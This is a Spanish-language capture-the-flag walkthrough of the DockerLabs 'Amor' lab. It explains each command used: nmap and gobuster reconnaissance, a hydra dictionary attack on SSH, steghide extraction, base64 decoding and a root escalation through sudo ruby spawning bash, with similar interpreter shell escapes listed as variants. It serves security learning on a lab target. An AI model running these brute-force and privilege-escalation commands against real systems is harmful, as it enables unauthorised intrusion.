# Desglose Detallado de Comandos - Reto DockerLabs: "Amor"

## 1. `scp -r amor kali@192.168.1.12:/home/kali/Documents/`

**Función:** Copia recursivamente (carpeta completa) desde máquina local a máquina remota usando SSH.

- `-r`: Recursivo (para directorios).
- `amor`: Carpeta origen.
- `kali@192.168.1.12`: Usuario y dirección IP del host remoto.
- `:/home/kali/Documents/`: Ruta destino en la máquina remota.

**Variantes útiles:**
- `scp archivo.txt usuario@IP:/ruta/`: Copiar solo un archivo.
- `scp -P 2222 archivo usuario@IP:/ruta/`: Usar un puerto SSH específico.
- `scp usuario@IP:/remoto.txt ./local/`: Descargar desde host remoto.

---

## 2. `sudo apt install docker.io`

**Función:** Instala Docker desde los repositorios oficiales en sistemas Debian/Ubuntu.

- `sudo`: Eleva permisos para instalar software.
- `apt install`: Instala paquetes.
- `docker.io`: Nombre del paquete de Docker.

**Variantes útiles:**
- `sudo apt update && sudo apt install docker.io`: Actualiza e instala.
- `sudo snap install docker`: Alternativa con Snap.
- `sudo apt install docker-ce`: Instalación desde Docker CE (requiere repositorio externo).

---

## 3. `ip add`

**Función:** Muestra todas las interfaces de red y sus direcciones IP.

**Variantes útiles:**
- `ip a`: Versión corta equivalente.
- `ip addr show docker0`: Mostrar solo interfaz Docker.
- `ip route`: Ver rutas de red activas.

---

## 4. `sudo netdiscover -i docker0 -r 172.17.0.0/24`

**Función:** Escanea la red en el rango 172.17.0.0/24 por ARP para descubrir dispositivos activos.

- `-i docker0`: Interfaz a usar (red interna de Docker).
- `-r`: Define el rango IP.

**Variantes útiles:**
- `sudo netdiscover -i eth0`: Escaneo en red física.
- `netdiscover -P`: Modo pasivo.
- `netdiscover -s`: Escaneo rápido.

---

## 5. `sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2`

**Función:** Escaneo agresivo de puertos y servicios en el host Docker.

- `--min-rate 5000`: Velocidad mínima del escaneo (rápido).
- `-p-`: Escanea todos los 65535 puertos.
- `-sS`: Escaneo TCP SYN (stealth).
- `-sV`: Detecta versión del servicio.

**Variantes útiles:**
- `-T4`: Ajuste de velocidad/agresividad.
- `-A`: Escaneo completo (SO, scripts, traceroute).
- `-Pn`: Desactiva detección de host.

---

## 6. `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

**Función:** Fuerza bruta de directorios web.

- `dir`: Modo de búsqueda de directorios.
- `-u`: URL del objetivo.
- `-w`: Diccionario de palabras.

**Variantes útiles:**
- `-x .php,.txt`: Fuerza extensiones.
- `-t 50`: Número de hilos.
- `-o resultado.txt`: Guarda resultados.

---

## 7. `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`

**Función:** Ataque de fuerza bruta por diccionario sobre servicio SSH.

- `-l carlota`: Usuario objetivo.
- `-P rockyou.txt`: Diccionario de contraseñas.
- `ssh://172.17.0.2`: Objetivo SSH.
- `-t 10`: 10 hilos en paralelo.

**Variantes útiles:**
- `-L usuarios.txt`: Lista de usuarios.
- `-f`: Finaliza al encontrar contraseña válida.
- `-vV`: Verbose detallado.

---

## 8. `ssh carlota@172.17.0.2`

**Función:** Conecta vía SSH con el usuario `carlota`.

**Variantes útiles:**
- `ssh -p 2222 user@IP`: Conectar a otro puerto.
- `ssh -i clave.pem user@IP`: Autenticación con clave privada.
- `ssh -v`: Modo verbose.

---

## 9. `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor`

**Función:** Descarga la imagen del host remoto a Kali.

**Misma lógica que `scp` explicado antes.**

---

## 10. `file imagen.jpg`

**Función:** Identifica el tipo de archivo mediante cabecera binaria.

**Variantes útiles:**
- `file *`: Analiza múltiples archivos.
- `file -i imagen.jpg`: Devuelve tipo MIME.

---

## 11. `steghide --extract -sf imagen.jpg`

**Función:** Extrae datos ocultos en un archivo con esteganografía.

- `--extract`: Extraer contenido.
- `-sf imagen.jpg`: Especifica archivo fuente.

**Variantes útiles:**
- `steghide info imagen.jpg`: Información del contenedor.
- `steghide embed -cf imagen.jpg -ef secreto.txt`: Insertar datos.

---

## 12. `echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo`

**Función:** Decodifica una cadena base64.

- `echo`: Imprime la cadena.
- `| base64 -d`: Decodifica base64.
- `; echo`: Asegura salto de línea al final.

**Variantes útiles:**
- `base64 archivo.txt`: Codifica archivo.
- `base64 -d archivo.b64`: Decodifica archivo.

---

## 13. `su oscar`

**Función:** Intenta cambiar de usuario al usuario `oscar`.

**Variantes útiles:**
- `su - oscar`: También carga variables de entorno.
- `whoami`: Confirmar cambio.

---

## 14. `sudo /usr/bin/ruby -e 'exec "/bin/bash"'`

**Función:** Escalada de privilegios mediante ejecución de shell desde Ruby.

- `sudo`: Ejecutar como root.
- `/usr/bin/ruby`: Intérprete de Ruby.
- `-e 'exec "/bin/bash"'`: Ejecuta bash como root.

**Variantes útiles:**
- `sudo python -c 'import os; os.system("/bin/bash")'`
- `sudo perl -e 'exec "/bin/sh";'`
- `sudo awk 'BEGIN {system("/bin/bash")}'`

---

## 15. `whoami`

**Función:** Muestra el usuario actual del sistema (útil para confirmar escalada de privilegios).

---

## 🔁 Diagrama de Flujo del Procedimiento

![Diagrama de Flujo](./ENTREGAS/ApellidoNombre/flujo_dockerlabs.png)
